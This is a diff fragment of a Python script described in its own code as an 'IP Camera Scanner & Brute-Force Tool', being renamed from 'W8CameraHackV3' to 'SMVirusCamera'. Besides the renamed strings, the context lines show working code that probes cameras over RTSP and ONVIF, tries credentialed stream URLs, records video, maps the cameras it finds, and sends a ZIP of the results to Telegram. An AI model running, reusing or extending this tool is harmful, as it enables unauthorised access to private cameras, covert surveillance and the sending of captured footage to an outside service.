             _rs.connect((_fp_ip, 554))
             _rs.sendall(
                 b"OPTIONS rtsp://" + _fp_ip.encode()
-                + b":554/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: W8Scanner\r\n\r\n")
+                + b":554/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: SMVScanner\r\n\r\n")
             _rb = _rs.recv(512).decode('utf-8', errors='replace')
             _rs.close()
             if _rb.startswith('RTSP/'):
@@ -23181,8 +23181,8 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             body = _ebml(_E['TcScale'], 1000000)     # 1 ms per timecode unit
             if dur_ms is not None:
                 body += _ebml_f8(_E['Duration'], float(dur_ms))
-            body += (_ebml(_E['MuxApp'], 'W8CameraHackV3')
-                     + _ebml(_E['WrtApp'], 'W8CameraHackV3'))
+            body += (_ebml(_E['MuxApp'], 'SMVirusCamera')
+                     + _ebml(_E['WrtApp'], 'SMVirusCamera'))
             return _ebml(_E['Info'], body)
 
         def _mk_tracks(avcc, w=1920, h=1080, fps=25.0):
@@ -23256,7 +23256,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             _sr_sock.connect((_sr_ip, _sr_port))
         except Exception as _ce:
             print(f"\n  {R}[!] Cannot connect: {_ce}{W}"); sys.exit(1)
-        _rtsp_req(f"OPTIONS rtsp://{_sr_ip}:{_sr_port}/ RTSP/1.0\r\nUser-Agent: W8Scanner")
+        _rtsp_req(f"OPTIONS rtsp://{_sr_ip}:{_sr_port}/ RTSP/1.0\r\nUser-Agent: SMVScanner")
         _rtsp_resp()
         print(f" {G}OK{W}")
 
@@ -23274,7 +23274,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                        if _sr_user else
                        f"rtsp://{_sr_ip}:{_sr_port}{_sp}")
             _rtsp_req(f"DESCRIBE {_sr_url} RTSP/1.0\r\n"
-                      "User-Agent: W8Scanner\r\nAccept: application/sdp")
+                      "User-Agent: SMVScanner\r\nAccept: application/sdp")
             _desc = _rtsp_resp()
             if '200 OK' in _desc and 'm=video' in _desc:
                 _sr_sdp = _desc; break
@@ -23309,7 +23309,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
         # ══ SETUP (TCP interleaved) ════════════════════════════════════════════
         print(f"  {C}[3/4] SETUP (TCP interleaved) ...{W}", end='', flush=True)
         _rtsp_req(f"SETUP {_sr_url} RTSP/1.0\r\n"
-                  "User-Agent: W8Scanner\r\n"
+                  "User-Agent: SMVScanner\r\n"
                   "Transport: RTP/AVP/TCP;unicast;interleaved=0-1")
         _setup = _rtsp_resp()
         _sm = _re_sr.search(r'Session:\s*([^;\r\n]+)', _setup)
@@ -23321,7 +23321,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
         # ══ PLAY ═══════════════════════════════════════════════════════════════
         print(f"  {C}[4/4] PLAY ...{W}", end='', flush=True)
         _rtsp_req(f"PLAY {_sr_url} RTSP/1.0\r\n"
-                  "User-Agent: W8Scanner\r\nRange: npt=0.000-")
+                  "User-Agent: SMVScanner\r\nRange: npt=0.000-")
         _play = _rtsp_resp()
         if '200 OK' not in _play:
             print(f"\n  {R}[!] PLAY failed{W}"); _sr_sock.close(); sys.exit(1)
@@ -23413,7 +23413,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
             print(f"\n  {Y}[stopped early — saving...]{W}")
         finally:
             try:
-                _rtsp_req(f"TEARDOWN {_sr_url} RTSP/1.0\r\nUser-Agent: W8Scanner")
+                _rtsp_req(f"TEARDOWN {_sr_url} RTSP/1.0\r\nUser-Agent: SMVScanner")
                 _sr_sock.close()
             except Exception: pass
 
@@ -23540,7 +23540,7 @@ footer{{color:#484f58;margin-top:32px;font-size:.85em}}</style></head><body>
                     f"http://{_sp_ip}:{_sp_port}{path}",
                     timeout=timeout, verify=False,
                     allow_redirects=False,
-                    headers={'User-Agent': 'Mozilla/5.0 (W8Scanner)'})
+                    headers={'User-Agent': 'Mozilla/5.0 (SMVScanner)'})
             except Exception:
                 return None
 
@@ -23760,7 +23760,7 @@ body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;min-h
 <div class="hdr">
   <div>
     <div class="hdr-title">&#128247; Stream Preview &mdash; {_sp_label}</div>
-    <div class="hdr-sub">Generated {_sp_ts_disp} &nbsp;&bull;&nbsp; W8CameraHackV3</div>
+    <div class="hdr-sub">Generated {_sp_ts_disp} &nbsp;&bull;&nbsp; SMVirusCamera</div>
   </div>
   <div class="hdr-badge{'warn' if _sp_capture_method=='none' else ''}">
     {'&#9888; No Frame' if _sp_capture_method=='none' else '&#10003; Frame Captured'}
@@ -23792,7 +23792,7 @@ body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;min-h
   </div>
 
 </div>
-<div class="footer">W8CameraHackV3 &nbsp;&bull;&nbsp; Stream Preview &nbsp;&bull;&nbsp; {_sp_ts_disp}</div>
+<div class="footer">SMVirusCamera &nbsp;&bull;&nbsp; Stream Preview &nbsp;&bull;&nbsp; {_sp_ts_disp}</div>
 </body>
 </html>"""
 
@@ -24049,7 +24049,7 @@ body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;min-h
             try:
                 kw = {'timeout': timeout, 'verify': False,
                       'allow_redirects': False,
-                      'headers': {'User-Agent': 'Mozilla/5.0 (W8Scanner)'}}
+                      'headers': {'User-Agent': 'Mozilla/5.0 (SMVScanner)'}}
                 if auth:
                     kw['auth'] = auth
                 return requests.get(
@@ -24142,7 +24142,7 @@ body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;min-h
                 f"http://{_cv_ip}:{_cv_port}/onvif/device_service",
                 data=_onvif_body,
                 headers={'Content-Type': 'application/soap+xml',
-                         'User-Agent': 'W8Scanner'},
+                         'User-Agent': 'SMVScanner'},
                 timeout=4, verify=False)
             if _ov_r.status_code == 200:
                 for _tag, _key in [('Manufacturer','Manufacturer'),
@@ -24448,7 +24448,7 @@ tbody tr:hover{{background:#1c2128}}
     <strong style="color:#79c0ff">{os.path.basename(_df_f1)}</strong>
     &nbsp;&rarr;&nbsp;
     <strong style="color:#79c0ff">{os.path.basename(_df_f2)}</strong>
-    &nbsp;&bull;&nbsp; {_df_ts_disp} &nbsp;&bull;&nbsp; W8CameraHackV3
+    &nbsp;&bull;&nbsp; {_df_ts_disp} &nbsp;&bull;&nbsp; SMVirusCamera
   </div>
 </div>
 <div class="stats">
@@ -24487,7 +24487,7 @@ tbody tr:hover{{background:#1c2128}}
 {_df_section('&#10003; Unchanged', '#8b949e', len(_same),
              _df_tbl_rows(_same, _df_d1))}
 </div>
-<div class="footer">W8CameraHackV3 &bull; Diff Report &bull; {_df_ts_disp}</div>
+<div class="footer">SMVirusCamera &bull; Diff Report &bull; {_df_ts_disp}</div>
 </body>
 </html>"""
 
@@ -24735,7 +24735,7 @@ body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;
 <div class="hdr">
   <div>
     <div class="hdr-title">&#127759; Camera Map &mdash; {os.path.basename(_mp_src)}</div>
-    <div class="hdr-sub">Generated {_mp_ts_disp} &nbsp;&bull;&nbsp; W8CameraHackV3</div>
+    <div class="hdr-sub">Generated {_mp_ts_disp} &nbsp;&bull;&nbsp; SMVirusCamera</div>
   </div>
   <div class="hdr-stats">
     <div class="stat">Total <span class="stat-val">{len(_mp_cams)}</span></div>
@@ -24887,7 +24887,7 @@ if (CAMERAS.length > 0) {{
         sys.exit(0)
 
     _parser = _ap.ArgumentParser(
-        prog='W8CameraHackV3',
+        prog='SMVirusCamera',
         description='IP Camera Scanner & Brute-Force Tool',
         add_help=False
     )
@@ -26353,7 +26353,7 @@ if (CAMERAS.length > 0) {{
                         continue
                     # ── Build ZIP archive containing all found files ──────────
                     import zipfile as _zf9, tempfile as _tf9, datetime as _dt9
-                    _zip9_name = (f"W8_Results_"
+                    _zip9_name = (f"SMV_Results_"
                                   f"{_dt9.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
                     _zip9_path = os.path.join(SCRIPT_DIR, _zip9_name)
                     _added9 = 0
@@ -26376,7 +26376,7 @@ if (CAMERAS.length > 0) {{
                         print(f"{Y5M}[→] Sending ZIP to Telegram...{W5M}")
                         send_telegram_file_blocking(
                             _zip9_path,
-                            f"📦 W8 Results Bundle — {_added9} files "
+                            f"📦 SMV Results Bundle — {_added9} files "
                             f"({_zip9_sz:.2f} MB)")
                         print(f"{G5M}[✓] ZIP sent!{W5M}")
                     except Exception as _ze9:
